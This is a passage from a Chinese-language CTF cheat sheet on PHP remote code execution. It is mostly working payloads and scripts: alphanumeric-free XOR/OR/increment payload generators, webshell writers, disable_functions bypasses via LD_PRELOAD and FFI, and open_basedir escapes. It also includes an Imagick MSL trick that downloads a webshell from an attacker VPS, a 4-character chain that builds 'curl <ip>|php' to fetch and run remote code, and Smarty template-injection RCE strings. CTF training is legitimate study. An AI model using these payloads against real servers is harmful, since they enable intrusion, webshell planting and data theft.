  `phpinfo()` → `('484880800'^'8.8-**)00'^'|~||||~()')`

  `system('ls')` → `('404008008400'^'9598))08*980'^'~|~|||(*~~*)')`

- 或（`|`）

  可以直接将需要构造的字符串与反引号进行**异或**，得到的结果再与反引号相**或**即可得到原字符串。

  复制

  ```
  <?php
  echo "````````"^"readfile";
  echo "````"^"flag";
  ```

  payload例：（`readfile("/flag")`）

  `$code = "('````````'|' ')('/````'|'/ '));//";`

  参考：

  https://blog.csdn.net/miuzzx/article/details/108569080

  https://blog.csdn.net/miuzzx/article/details/109143413

  构造：

  复制

  ```
  <?php
  
  /* author yu22x */
  
  $myfile = fopen("or_rce.txt", "w");
  $contents="";
  for ($i=0; $i < 256; $i++) { 
  	for ($j=0; $j <256 ; $j++) { 
  
  		if($i<16){
  			$hex_i='0'.dechex($i);
  		}
  		else{
  			$hex_i=dechex($i);
  		}
  		if($j<16){
  			$hex_j='0'.dechex($j);
  		}
  		else{
  			$hex_j=dechex($j);
  		}
  		$preg = '/[0-9a-z]/i';//根据题目给的正则表达式修改即可
  		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
  					echo "";
      }
    
  		else{
  		$a='%'.$hex_i;
  		$b='%'.$hex_j;
  		$c=(urldecode($a)|urldecode($b));
  		if (ord($c)>=32&ord($c)<=126) {
  			$contents=$contents.$c." ".$a." ".$b."\n";
  		}
  	}
  
  }
  }
  fwrite($myfile,$contents);
  fclose($myfile);
  ```

  复制

  ```
  # -*- coding: utf-8 -*-
  
  # author yu22x
  
  import requests
  import urllib
  from sys import *
  import os
  def action(arg):
     s1=""
     s2=""
     for i in arg:
         f=open("or_rce.txt","r")
         while True:
             t=f.readline()
             if t=="":
                 break
             if t[0]==i:
                 #print(i)
                 s1+=t[2:5]
                 s2+=t[6:9]
                 break
         f.close()
     output="(\""+s1+"\"|\""+s2+"\")" #双引号可换单引号
     return(output)
     
  while True:
     param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
     print(param)
  ```

- `++`运算自增构造

  复制

  ```
  <?php
  $a=(_/_._)[0];//直接拼接成字符串并切片
  $o=++$a;//$o=++$a是先把$a进行自增，自增完成之后再将值返回，也就是这一句结束的时候 $a和$o都是O
  $o=++$a.$o;//$o=>PO,$a=>P
  $a++;//Q
  $a++;//R
  $o.=++$a;//$o=>POS,$a=>S
  $o.=++$a;//$o=>POST,$a=>T
  $_=_.$o;//_POST
  $$_[0]($$_[_]);//$_POST[0]($_POST[_]);
  
  //Payload:
  //code=$%ff=(_/_._)[0];$%fe=%2b%2b$%ff;$%fe=%2b%2b$%ff.$%fe;$%ff%2b%2b;$%ff%2b%2b;$%fe.=%2b%2b$%ff;$%fe.=%2b%2b$%ff;$_=_.$%fe;$$_[0]($$_[_]);&0=system&_=id
  //code=$_=(_/_._)[_];$_++;$__=$_.$_++;++$_;++$_;$$_[$_=_.$__.++$_.++$_]($$_[_]);&_POST=system&_=id
  ```

  复制

  ```
  #!/usr/bin/env python3
  #-*- coding:utf-8 -*-
  #__author__: 颖奇L'Amore www.gem-love.com
  import requests
  from urllib.parse import quote_plus
  
  def g(payload, buff):
  	offset = 3 + buff
  	res = ""
  	base = 65
  	for i in range(len(payload)):
  		if payload[i] == '_' or payload[i] == '/':
  			continue
  		_ascii = ord(payload[i])
  		#init
  		underline =  "$" + ("_" * (i + offset))
  		undefined = "$" + ("_" * (len(payload) + offset + 15))
  		var = f"++{underline};$__-={underline};$__++;{underline}/=$__;{underline}=(({undefined}/{undefined}).{underline})"+r"{++$__};$__--;"
  		res += var;
  		tmp = ''
  		if _ascii > base:
  			for i in range(_ascii-base):
  				tmp = tmp + f"++{underline};"
  		res += tmp
  
  	first =  "$" + ("_" * offset)
  	for i in range(1, len(payload)):
  		if payload[i] == '_':
  			res += f"{first}.='_';"
  			continue
  		if payload[i] == '/':
  			res += f"{first}.='/';"
  			continue
  		final_var = "$" + ("_" * (i + offset))
  		res += f"{first}.={final_var};"
  	return [res, "$" + "_" * (offset)]
  
  pre = "'');"
  after = '//'
  
  buff = len('STRTOLOWERSHOW_SOURCE')
  flag = g("/FLAG", buff)
  
  buff = len('STRTOLOWER')
  showsource = g("SHOW_SOURCE", buff)
  
  buff = 0
  strtolower = g('STRTOLOWER', buff)
  
  final = ''
  
  #1.构造STRTOLOWER并存进变量a
  final += strtolower[0]
  a = strtolower[1] # a = '$___' # STRTOLOWER
  
  #2.构造SHOW_SOURCE并存进变量b
  final += showsource[0]
  b = showsource[1] # b = '$_____________' #SHOW_SOURCE
  
  #3.构造/FLAG并存进变量c
  final += flag[0] + flag[1] + "='/'." + flag[1] + ';'
  c = flag[1] # c = '$________________________' #/FLAG
  
  #声明好abc变量
  padding = f'$______________________________________________={a};$_______________________________________________={b};$________________________________________________={c};'
  final += padding
  
  # 4.变量d = a(c) 则变量d为/flag
  d = "$______________________________________________($________________________________________________);"
  padding = '$_________________________________________________='+d
  final += padding
  
  #5. b(d) 即为SHOW_SOURCE('/flag')
  final += '$_______________________________________________($_________________________________________________);'
  
  final = pre + final
  final = final + after
  print(final.replace('+', '%2b'))
  ```

  复制

  ```
  #关键字构造
  #$_GET[0]($_GET[1]);
  need = 'GET'
  
  alpha = list(set(need))
  alpha.sort()
  print(alpha)
  greece = 'α β γ δ ε ζ ν ξ ο π ρ σ η θ ι κ λ μ τ υ φ χ ψ ω Γ Δ'.split(' ')
  
  out = '$_=C;'
  cnt = ord('C')
  
  for k in alpha:
  	if ord(k)-ord('C') in range(26):
  		now_php = ''
  		for i in range(ord(k)-cnt):
  			now_php += '$_++;'
  			cnt += 1
  		icon = greece[ord(k)-ord('C')]
  		now_php += f'${icon}=$_;'
  		out += now_php
  
  func = []
  for k in need:
  	if ord(k)-ord('C') in range(26):
  		icon = greece[ord(k)-ord('C')]
  		func += [f'${icon}']
  	else:
  		func += [k]
  func = '.'.join(func)
  print(func)
  
  payload = f'{out}?><?=(${{_.{func}}}[0])(${{_.{func}}}[1]);'
  print(payload)
  ```

- 文件上传+执行

  参考：

  https://blog.csdn.net/qq_46091464/article/details/108513145

  https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html

  发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是`/tmp/phpXXXXXX`，文件名最后6个字符是随机的大小写字母。

  执行`. /tmp/phpXXXXXX`，也是有字母的。此时就可以用到Linux下的glob通配符：

  - `*`可以代替0个及以上任意字符

  - `?`可以代表1个任意字符

    那么，`/tmp/phpXXXXXX`就可以表示为`/*/?????????`或`/???/?????????`。

    但是，在执行第一个匹配上的文件的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。

    glob通配符支持用`[^x]`的方法来构造“这个位置不是字符x”。可以利用`[@-[]`来表示大写字母。当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。

    **POST上传文件数据包**：

    复制

    ```
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>POST数据包POC</title>
    </head>
    <body>
    <form action="http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/" method="post" enctype="multipart/form-data">
    <!--链接是当前打开的题目链接-->
        <label for="file">文件名：</label>
        <input type="file" name="file" id="file"><br>
        <input type="submit" name="submit" value="提交">
    </form>
    </body>
    </html>
    ```

    在上传文件`1.php`内容添加**sh命令**：

    复制

    ```
    #!/bin/sh
    ls
    ```

    上传抓包，构造**poc执行命令**：

    `?c=./???/????????[@-[]`

- 通配符（仅无字母）

  base64: `/???/????64 ????.???`

  bzip2: `/???/???/????2 ????.???`

- `[~(异或)][!%FF]`形式

  复制

  ```
  def one(s):
      ss = ""
      for each in s:
          ss += "%" + str(hex(255 - ord(each)))[2:].upper()
      return f"[~{ss}][!%FF]("
  
  """
  组成类似于system(pos(next(getallheaders())));即可
  a=whoami
  """
  while 1:
      a = input(":>").strip(")")
      aa = a.split("(")
      s = ""
      for each in aa[:-1]:
          s += one(each)
      s += ")" * (len(aa) - 1) + ";"
      print(s)
  ```

- eval函数下

  - 字符串拼接

    `a=(s.y.s.t.e.m)('cat /flag');`

  - 进制编码

    `a=hex2bin('73797374656d')('cat /flag');`

  - 异或

    `a=('0000000'^'CICDU]')('cat /flag');`

    `a=('404008008400'^'9598))08*980'^'~|~|||(*~~*)');`

  - 套娃

    `a=eval($_POST[1]);&1=phpinfo();`

- 纯数字构造（Linux系统级）

  复制

  ```
  $((${_}))
  #0
  
  $((~$((${_}))))
  #-1
  
  $((~$(($((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))+$((~$((${_}))))))))
  #36
  #去+号也可
  
  $((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))
  #36	
  #去+号也可
  ```

参考：

[CTFshow-RCE极限大挑战](https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah)

[CTFshow-周末大挑战](https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc)



### 无参数/带参数RCE

#### 无参函数

- phpinfo()

- phpversion()

  `chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))) -> .`

  `chr(ord(hebrevc(crypt(phpversion())))) -> .`

- localeconv()

  返回一包含本地数字及货币格式信息的数组，而数组第一项就是`.`。

- time()

  返回当前Unix时间戳。

- localtime()

  取得本地时间。

- getcwd()

  返回当前工作目录。

- dirname()

  返回路径中的目录部分。

- getenv()

  获取一个环境变量的值（在7.1之后可以不给予参数）。

- getallheaders()

  获取全部HTTP请求头信息。（Apache）

- apache_request_headers()

  获取全部 HTTP 请求头信息，包含当前请求所有头信息的数组，失败返回 FALSE。（Apache）

- get_defined_vars()

  返回由所有已定义变量所组成的数组。（Nginx）

- get_defined_functions()

  返回由所有已定义函数所组成的数组。

- session_start()

  启动新会话或者重用现有会话，告诉PHP使用session。（PHP默认是不主动使用session的，配合`session_id()`）

- realpath_cache_get()

  获得真实路径缓存的详情。

- get_class()

  获取当前调用方法的类名。

- get_called_class()

  获取静态绑定后的类名。

- ini_get_all()

  以数组的形式返回整个php的环境变量（配置信息）。

- __HALT_COMPILER()

  中断编译器的执行。（中断php的执行，不会检查后面的语句）

#### 套用函数（有参）

- array_map()

  返回用户自定义函数作用后的数组。

  `array_map('system',['ls']);`

- scandir()

  列出指定路径中的文件和目录。

  `scandir('.')`

- glob()

  返回匹配指定模式的文件名或目录。

  `print_r(glob("*"));`

  `print_r(glob("./*")[2]);`

- current()

  返回数组中的当前单元，默认取第一个值。

  `current(localeconv()) → .`

  `?code=eval(end(current(get_defined_vars())));&b=phpinfo();`

- pos()

  返回数组中的当前元素的值，`current()`函数的别名。

- next() / prev() / reset() / end()

  将数组的内部指针向前移动一位 / 倒回一位 / 指向第一个单元 / 指向最后一个单元。

  `end(getallheaders()) + REQUEST-HEADER-last xx:yy = yy` （配合自定义请求头绕过关键字）

- assert() / eval()

  命令执行。

  `assert(phpinfo(););`

  `assert(assert($_POST[c]));`

- chdir()

  改变目录。

- file_get_contents()

- highlight_file() / show_source()

- readfile() / readgzfile()

- echo()

- print_r()

- var_dump()

- dirname()

  返回路径中的目录部分。

- chr()

  从指定的 ASCII 值返回字符。

- array_pop()

  弹出并返回数组最后一个元素的值，并将数组的长度减一。

- array_reverse()

  以相反的元素顺序返回数组。

- array_rand()

  返回数组中的随机键名，或者如果规定函数返回不只一个键名，则返回包含随机键名的数组。

- array_flip()

  用于反转/交换数组中所有的键名以及它们关联的键值。

- array_slice()

  在数组中根据条件取出一段值，并返回。

- hex2bin()

  转换十六进制字符串为二进制字符串。

- session_id()

  获取到当前的session id。

  `session_id(session_start())`

- create_function()

  创建一个匿名函数（lambda样式）。代码注入。

- hex2bin()

  把十六进制值转换为 ASCII 字符。

  `hex2bin('73797374656D') -> system`

#### 参考

https://www.cnblogs.com/wangtanzhi/p/12311239.html



### 列目录

- SPL目录类：`DirectoryIterator`

  复制

  ```
  <?php
  //可用于猜解文件名
  $a = new DirectoryIterator("glob:///*");
  foreach($a as $f){
      echo($f->__toString().'<br>');
  }
  ?>
  ```

- SPL目录类：`FilesystemIterator`

  复制

  ```
  <?php
  echo new FilesystemIterator(getcwd());
  ?>
  ```

- SPL目录类：`GlobIterator`

  可通配例如`/var/html/www/flag*`

- scandir()

- 面向过程方法：opendir()，readdir()，closedir()

- 面向对象方法：PHP的`dir`类

  

### 读文件

- 特殊文件：

  - /proc/self/cmdline - 应用运行的文件夹

  - /proc/self/environ（/proc/1/environ） - 当前进程的环境变量列表，彼此间用空字符（NULL）隔开；变量用大写字母表示，其值用小写字母表示。重要的属性，比如WEB服务的权限

  - /proc/self/cwd - 当前目录

  - /proc/[PID]/fd/[NUM] - 是个目录，包含当前进程打开的每一个文件的文件描述符，这些文件描述符是指向实际文件的一个符号链接

  - /proc/self/maps + /proc/self/mem

    文件读取部分如可以seek读取，第一步通过 `/proc/self/maps` 读取堆栈分布，再读取 `/proc/self/mem` 的内存数据，再通过正则筛选符合格式的数据。

    复制

    ```
    import requests, re
    
    url = ""
    maps_url = f"{url}?file=/proc/self/maps"
    maps_reg = "([a-z0-9]{12}-[a-z0-9]{12}) rw.*?00000000 00:00 0"
    maps = re.findall(maps_reg, requests.get(maps_url).text)
    # print(maps)
    for m in maps:
        start, end = m.split("-")[0], m.split("-")[1]
        Offset, Length = str(int(start, 16)), str(int(end, 16) - int(start, 16))
        read_url = f"{url}?file=/proc/self/mem&offset={Offset}&length={Length}"
        s = requests.get(read_url).content
        rt = re.findall(b"[a-z0-9]{8}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}", s)
        if rt:
            print(rt)
    ```

- file_get_contents() / highlight_file() / show_source() / readfile() / readgzfile() / print_r(file())

- fopen() / fread() / fgets() / fgetc() / fgetss() / fgetcsv()

  复制

  ```
  $a=fopen("flag.php","r");while (!feof($a)) {$line = fgetss($a);echo $line;}       //php7.3版本后 该函数已不再被使用
  $a=fopen("flag.php","r");echo fpassthru($a);                                     
  $a=fopen("flag.php","r");echo fread($a,"1000");                                   
  $a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}       
  $a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}       
  $a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);print_r($line);} 
  ```

- include() / require()

  适用非php文件

- SPL文件类：`SplFileObject`

  按行读取，多行需要遍历。适配伪协议，如 `php://filter`。

- Mysql

  复制

  ```
  <?php
  $conn = new mysqli("localhost", "root", "root");
  if ($conn->connect_error) {
      die("连接失败: " . $conn->connect_error);
  } 
   
  $sql = "SELECT LOAD_FILE('/flag.txt') as my";
  $result = $conn->query($sql);
   
  if ($result->num_rows > 0) {
      while($row = $result->fetch_assoc()) {
          echo $row["my"];
      }
  } else {
      echo "0 结果";
  }
  $conn->close();
  ?>
  ```

  

### 写文件

- file_put_contents()

- SplFileObject::fwrite()

  复制

  ```
  define("EV", "eva"."l");
  define("GETCONT", "fil"."e_get_contents");
  // 由于禁止了$，从已有的地方获取$符
  define("D",(GETCONT)('/var/www/html/index.php')[353]);
  define("SHELL","<?php ".EV."(".D."_POST['a']);");
  echo (GETCONT)('./shell.php');
  
  class splf extends SplFileObject {
  
      public function __destruct() {
          parent::fwrite(SHELL);
      }
  }
  define("PHARA", new splf('shell.php','w'));
  ```

- FTP

  Python开启FTP服务

  复制

  ```
  from pyftpdlib.authorizers import DummyAuthorizer
  from pyftpdlib.handlers import FTPHandler
  from pyftpdlib.servers import FTPServer
  
  authorizer = DummyAuthorizer()
  authorizer.add_anonymous("./")
  
  handler = FTPHandler
  handler.authorizer = authorizer
  handler.masquerade_address = "ip"
  # 注意要用被动模式
  handler.passive_ports = range(9998,10000)
  
  server = FTPServer(("0.0.0.0", 23), handler)
  server.serve_forever()
  ```

  PHP下载

  复制

  ```
  $local_file = '/tmp/hack1.so';
  $server_file = 'hack.so';
  $ftp_server = 'xxxxx';
  $ftp_port=21;
  
  $ftp = ftp_connect($ftp_server,$ftp_port);
  
  $login_result = ftp_login($ftp, 'anonymous', '');
  // 注意要开启被动模式
  ftp_pasv($ftp,1);
  
  if (ftp_get($ftp, $local_file, $server_file, FTP_BINARY)) {
      echo "Successfully written to $local_file\n";
  } else {
      echo "There was a problem\n";
  }
  
  ftp_close($ftp);
  ```



### 读类信息

- ReflectionClass::export()



### new+原生类

- `eval("echo new $a($b);");`

  复制

  ```
  ?a=Exception&b=system('whoami')
  ?a=SplFileObject&b=system('whoami')
  ```

- `echo new $a($b);`

  复制

  ```
  列目录
  ?a=DirectoryIterator&b=glob://f*
  
  读文件
  ?a=SplFileObject&b=1.php
  ?a=SplFileObject&b=php://filter/convert.base64-encode/resource=1.php
  ```

- `new $a($b);`

  参考：[Exploiting Arbitrary Object Instantiations in PHP without Custom Classes](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

  复制

  ```
  ?a=Imagick&b=http://121.40.253.177:7777
  nc -lvnp 7777
  ```

  按照文中的POC，在VPS中生成一个图片，含有一句话木马：

  `convert xc:red -set 'Copyright' '<?php @eval(@$_REQUEST["a"]); ?>' positiv e.png`

  在VPS中监听12345端口，再往服务器发送请求包如下：

  复制

  ```
  POST /?b=Imagick&c=vid:msl:/tmp/php* HTTP/1.1
  Host: 1.1.1.1:32127
  Cache-Control: max-age=0
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/53
  7.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,i
  mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
  Accept-Encoding: gzip, deflate
  Accept-Language: zh-CN,zh;q=0.9
  Connection: close
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeTvfNEmq
  Tayg6bqr
  Content-Length: 348
  
  ------WebKitFormBoundaryeTvfNEmqTayg6bqr
  Content-Disposition: form-data; name="123"; filename="exec.msl"
  Content-Type: text/plain
  
  <?xml version="1.0" encoding="UTF-8"?>
  <image>
  <read filename="http://vps:12345/positive.png" />
  <write filename="/var/www/html/positive.php"/>
  </image>
  ------WebKitFormBoundaryeTvfNEmqTayg6bqr--
  ```

  发送后，靶机就往VPS中请求了该文件，并且把该文件下载到了指定目录，访问后即可RCE。

  这种手法的限制：

  1. 需要通网，当然如果不通网这种手法也存在一个重命名文件的功能，如果网站有上传功能可以利用这个手法将恶意的JPG重命名成PHP；
  2. 需要知道网站的目录（比赛中通常是/var/www/html或者/app这类）；
  3. 需要在网站目录下有写权限，当然如果知道类似于upload这种文件夹的路径也可以（因为通常它们是可写的；
  4. 最最重要的：需要有装Imagick扩展，该扩展其实不是默认自带的（一定程度上限制了攻击面）。

- `$class = new $a($b);` / `(new $a($b))->$c();`

  复制

  ```
  $class=new Exception("test string");
  echo $class‐>__toString();
  
  echo new Error('system')->getMessage();
  ```

  

### bypass disable_function

- **LD_PRELOAD**

  Linux操作系统的动态链接库在加载过程中，动态链接器会先读取LD_PRELOAD环境变量和默认配置文件 `/etc/ld.so.preload`，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和 `/etc/ld.so.preload` 配置文件中指定的动态链接库依然会被装载，因为它们的优先级比LD_LIBRARY_PATH环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。

  通过LD_PRELOAD环境变量，能够轻易的加载一个动态链接库。通过这个动态库劫持系统API函数，每次调用都会执行植入的代码。

  利用 `error_log` 与 `mail` 函数劫持 `getuid` 函数，系统通过环境变量(env)中的LD_PRELOAD加载动态链接库。

  复制

  ```
  // hack.c
  // 将其按照系统操作位数生成对应的so文件
  // gcc -c -fPIC hack.c -o hack
  // gcc --share hack -o hack.so
  
  #include <stdlib.h>
  #include <stdio.h>
  #include <string.h>
  
  __attribute__ ((__constructor__)) void preload (void){
      unsetenv("LD_PRELOAD");
      system("id");
  }
  ```

- 函数替代：mail() -> mb_send_mail()

- 参考

  [利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令](https://wooyun.js.org/drops/利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令.html)

  [RCTF 2022 - filechecker-pro-max](https://pankas.top/2022/12/12/rctf-web/#filechecker-pro-max)

- **UAF**

  **[php7-gc-bypass](https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php)**，**[php7-backtrace-bypass](https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php)**，**[php-json-bypass](https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php)**

  法1：修改`pwn()`传入的`cmd`，上传php至可写目录，include包含执行。

  法2：无需上传，将代码放入`eval`函数执行。

  - 参考题

    buuoj-GKCTF2020-CheckIn

- **FFI**

  使用条件：PHP版本>=7.4

  复制

  ```
  $ffi = FFI::cdef("int system(const char *command);"); 
  $ffi->system("cd /;./readflag > /var/www/html/good.txt"); 
  readgzfile("good.txt");
  ```

  复制

  ```
  //直接调用php源码中的函数，php_exec的type为3时对应的是passthru，直接将结果原始输出
  $e=FFI::cdef("int php_exec(int type, char *cmd);");
  $e->php_exec(3,$_REQUEST['cmd']);
  ```

  复制

  ```
  //使用c里的popen，然后从管道中读取结果
  $ffi = FFI::cdef("void *popen(char*,char*);void pclose(void*);int fgetc(void*);","libc.so.6");
  $o = $ffi->popen("ls /","r");
  $d = "";
  while(($c = $ffi->fgetc($o)) != -1){
      $d .= str_pad(strval(dechex($c)),2,"0",0);
  }
  $ffi->pclose($o);
  echo hex2bin($d);/*
  ```

- 参考

  [PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数](https://www.anquanke.com/post/id/197745)



### bypass open_basedir

复制

```
mkdir('/tmp/test');chdir('/tmp/test');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));@eval($_POST[a]); echo 1;
chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('/flag'));
```



### 长度限制

- **7字符**

  复制

  ```
  #写入语句
  <?php eval($_GET[1]);
  #base64编码后
  PD9waHAgZXZhbCgkX0dFVFsxXSk7
  #需要被执行的语句：
  echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d>1.php
  ```

  复制

  ```
  >hp
  >1.p\\
  >d\>\\
  >\ -\\
  >e64\\
  >bas\\
  >7\|\\
  >XSk\\
  >Fsx\\
  >dFV\\
  >kX0\\
  >bCg\\
  >XZh\\
  >AgZ\\
  >waH\\
  >PD9\\
  >o\ \\
  >ech\\
  ls -t>0
  sh 0
  ```

  复制

  ```
  #!/usr/bin/python
  # -*- coding: UTF-8 -*-
   
   
  import requests
   
  url = "http://192.168.61.157/rce.php?1={0}"
  print("[+]start attack!!!")
  with open("payload.txt","r") as f:
  	for i in f:
  		print("[*]" + url.format(i.strip()))
  		requests.get(url.format(i.strip()))
   
  #检查是否攻击成功
  test = requests.get("http://192.168.61.157/1.php")
  if test.status_code == requests.codes.ok:
  	print("[*]Attack success!!!")
  ```

- **5字符**

  - 思路1

    拼接字符串写入一句话，同7字符。

  - 思路2

    复制

    ```
    <?php eval($_GET[1]);
    ```

    复制

    ```
    >dir
    >f\>
    >ht-
    >sl
    *>v
    >rev
    *v>0
    >a
    >hp
    >p\\
    >1.\\
    >\>\\
    >-d\\
    >\ \\
    >64\\
    >se\\
    >ba\\
    >\|\\
    >7\\
    >Sk\\
    >X\\
    >x\\
    >Fs\\
    >FV\\
    >d\\
    >X0\\
    >k\\
    >g\\
    >bC\\
    >h\\
    >XZ\\
    >gZ\\
    >A\\
    >aH\\
    >w\\
    >D9\\
    >P\\
    >S}\\
    >IF\\
    >{\\
    >\$\\
    >o\\
    >ch\\
    >e\\
    sh 0
    sh f            
    ```

    复制

    ```
    #!/usr/bin/python
    # -*- coding: UTF-8 -*-
    import requests
    url = "http://192.168.61.157/?cmd={0}"
    print("[+]start attack!!!")
    with open("payload.txt","r") as f:
        for i in f:
            print("[*]" + url.format(i.strip()))
            requests.get(url.format(i.strip()))
    #检查是否攻击成功
    test = requests.get("http://192.168.61.157/1.php")
    if test.status_code == requests.codes.ok:
        print("[*]Attack success!!!")
    ```

- **4字符**

  - 思路1

    传入`>cat`，在目标目录下写入cat文件；

    再使用通配符进行执行`>* /*`，读取根目录下的flag文件。

  - 思路2

    字符拼接

    复制

    ```
    >dir
    >f\>
    >ht-
    >sl
    *>v        (等同于命令：dir "f>" "ht-" "sl" > v)
    >rev
    *v>0        (等同于命令：rev v > 0)(0里面的内容位:ls -th >f)
    sh 0        (sh执行0里面的内容)
    ```

  - 思路3

    反弹shell

    复制

    ```
    #-*-coding:utf8-*-
    import requests as r
    from time import sleep
    import random
    import hashlib
    target = 'http://52.197.41.31/'
     
    # 存放待下载文件的公网主机的IP
    shell_ip = 'xx.xx.xx.xx'
     
    # 本机IP
    your_ip = r.get('http://ipv4.icanhazip.com/').text.strip()
     
    # 将shell_IP转换成十六进制
    ip = '0x' + ''.join([str(hex(int(i))[2:].zfill(2))
                         for i in shell_ip.split('.')])
     
    reset = target + '?reset'
    cmd = target + '?cmd='
    sandbox = target + 'sandbox/' + 
        hashlib.md5('orange' + your_ip).hexdigest() + '/'
     
    # payload某些位置的可选字符
    pos0 = random.choice('efgh')
    pos1 = random.choice('hkpq')
    pos2 = 'g'  # 随意选择字符
     
    payload = [
        '>dir',
        # 创建名为 dir 的文件
     
        '>%s>' % pos0,
        # 假设pos0选择 f , 创建名为 f> 的文件
     
        '>%st-' % pos1,
        # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，
        # 因为alphabetical序中t>s
     
        '>sl',
        # 创建名为 >sl 的文件；到此处有四个文件，
        # ls 的结果会是：dir f> kt- sl
     
        '*>v',
        # 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f> kt- sl`>v ，
        #  前面提到dir是不换行的，所以这时会创建文件 v 并写入 f> kt- sl
        # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符
     
        '>rev',
        # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f> kt- rev sl v
     
        '*v>%s' % pos2,
        # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。
        # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk > f
     
        # 续行分割 curl 0x11223344|php 并逆序写入
        '>p',
        '>ph\',
        '>|\',
        '>%s\' % ip[8:10],
        '>%s\' % ip[6:8],
        '>%s\' % ip[4:6],
        '>%s\' % ip[2:4],
        '>%s\' % ip[0:2],
        '> \',
        '>rl\',
        '>cu\',
     
        'sh ' + pos2,
        # sh g ;g 的内容是 ls -tk > f ，那么就会把逆序的命令反转回来，
        # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行
        'sh ' + pos0,
        # sh f 执行curl命令，下载文件，写入木马。
    ]
     
    s = r.get(reset)
    for i in payload:
        assert len(i) <= 4
        s = r.get(cmd + i)
        print '[%d]' % s.status_code, s.url
        sleep(0.1)
    s = r.get(sandbox + 'fun.php?cmd=uname -a')
    print '[%d]' % s.status_code, s.url
    print s.text
    ```

    

### 模板引擎

对于PHP的模板引擎，很有可能是smarty或者twig。

根据流程图测试：

![image-20220309192940209](https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/image-20220309192940209-16468253816721.png)

#### smarty

复制

```
X-Forwarded-For: {{system("ls")}} （有回显）
{$smarty.version} （smarty版本号）
{php}phpinfo();{/php} （废弃）
{if phpinfo()}{/if}
{self::getStreamVariable(“file:///etc/passwd”)} （旧版本）

{$s=$smarty.template_object->smarty}{$fp=$smarty.template_object->compiled->filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,"<?php+phpinfo();",$s)}

{$smarty.template_object->smarty->disableSecurity()->display('string:{system(\'id\')}')}

{function name='rce(){};system("id");function '}{/function}

# Smarty3 
string:{include file='C:/Windows/win.ini'}

string:{function name='x(){};system(whoami);function '}{/function} （CVE-2021-26120，Smarty<3.1.39）

string:{$smarty.template_object->smarty->_getSmartyObj()->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->enableSecurity()->display('string:{system(whoami)}')}
